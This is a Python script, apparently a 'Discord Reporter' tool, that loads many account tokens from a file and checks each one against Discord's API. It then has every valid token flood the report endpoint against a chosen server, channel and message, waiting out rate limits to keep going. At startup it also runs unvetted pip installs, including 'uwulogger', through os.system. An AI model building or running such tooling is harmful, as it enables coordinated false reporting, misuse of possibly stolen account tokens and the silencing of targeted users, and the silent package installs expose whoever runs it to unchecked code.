import os
import sys
import time
import threading
import requests
from datetime import datetime
from pystyle import Colorate, Colors



def AizenEncryptor(modulename):
    try:
        return __import__(modulename)
    except ImportError:
        log.dbg(f"Installing missing module {modulename}")
        os.system(f"{sys.executable} -m pip install {modulename}")
        return __import__(modulename)

time = AizenEncryptor("time")
requests = AizenEncryptor("requests")
Thread = AizenEncryptor("threading").Thread
datetime = AizenEncryptor("datetime").datetime
Colorate = AizenEncryptor("pystyle").Colorate
Colors = AizenEncryptor("pystyle").Colors

os.system("pip install uwulogger")

from Leveragers import log

os.system('cls' if os.name == 'nt' else 'clear')


art ="""

                                   ██╗  ██╗    ██████╗ ██╗      ██████╗ ██╗████████╗
                                   ╚██╗██╔╝    ██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
                                    ╚███╔╝     ██████╔╝██║     ██║   ██║██║   ██║   
                                    ██╔██╗     ██╔═══╝ ██║     ██║   ██║██║   ██║   
                                   ██╔╝ ██╗    ██║     ███████╗╚██████╔╝██║   ██║   
                                   ╚═╝  ╚═╝    ╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                  
                                                  DEV BY  => @father.iso
                                                  GITHUB  => father
                                                  YOUTUBE => @father.iso
                                                  
                                  # Mass reporting should protect, not silence # \n\n
                                  """
                                          
print(Colorate.Horizontal(Colors.blue_to_red,art+"\n"))

def updateTitle():
    startTime = datetime.now()
    while True:
        try:
            elapsed = datetime.now() - startTime
            seconds = elapsed.seconds
            milliseconds = elapsed.microseconds // 1000
            title = (f"Discord Reporter | Tokens: {len(validTokens)} | Time: {seconds}s {milliseconds}ms")
            sys.stdout.write(f"\x1b]2;{title}\x07")
            
        except Exception as e:
            log.warn(f"Failed to update title: {e}")
            break


def loadTokens(filePath="tokens.txt"):
    try:
        with open(filePath, 'r') as file:
            tokens = [line.strip() for line in file if line.strip()]
            return tokens
    except FileNotFoundError:
        log.crit(f"'{filePath}' not found.")
        exit()



def validateToken(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0'
    }
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            username = response.json().get('username', 'Unknown')
            validTokens.append((token, username))
            log.success(f"Valid token: {username}")
            time.sleep(0.3)
        else:
            log.warn("Invalid token.")
    except requests.RequestException:
        log.err("Error validating token.")


def massReport(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0'
    }
    payload = {
        'channel_id': channelId,
        'guild_id': guildId,
        'message_id': messageId,
        'reason': reason
    }
    try:
        while True:
            response = requests.post('https://discord.com/api/v9/report', headers=headers, json=payload)
            if response.status_code == 201:
                log.success("Report sent.")
            elif response.status_code == 429:
                retryAfter = response.json().get('retry_after', 1)
                log.ratelimit(f"Rate limit hit. Retrying in {retryAfter}s.")
                time.sleep(retryAfter)
            else:
                log.warn(f"Unexpected response: {response.status_code}")
                break
    except requests.RequestException as e:
        log.err(f"Reporting error: {e}")


tokens = loadTokens()
validTokens = []

threads = []
for token in tokens:
    thread = Thread(target=validateToken, args=(token,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

log.inf(f"Valid tokens: {len(validTokens)}")
time.sleep(1)

os.system('cls' if os.name == 'nt' else 'clear')

Thread(target=updateTitle, daemon=True).start()


print(Colorate.Horizontal(Colors.blue_to_red,art))
log.inf("[1] ILLEGAL CONTENT")
log.inf("[2] HARASSMENT")
log.inf("[3] SPAM")
log.inf("[4] SELF HARM")
log.inf("[5] NSFW CONTENT")

try:
    reason = log.inp("Choose: ")
    guildId = log.inp("Server ID: ")
    channelId = log.inp("Channel ID: ")
    messageId = log.inp("Message ID: ")
except Exception as e:
    log.err(f"Input error: {e}")
    exit()

os.system('cls' if os.name == 'nt' else 'clear')
log.inf("Starting reports...")

threads = []
for token, username in validTokens:
    log.inf(f"Logging in | {username}")
    time.sleep(3)
    thread = Thread(target=massReport, args=(token,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

log.success("All reports processed.")
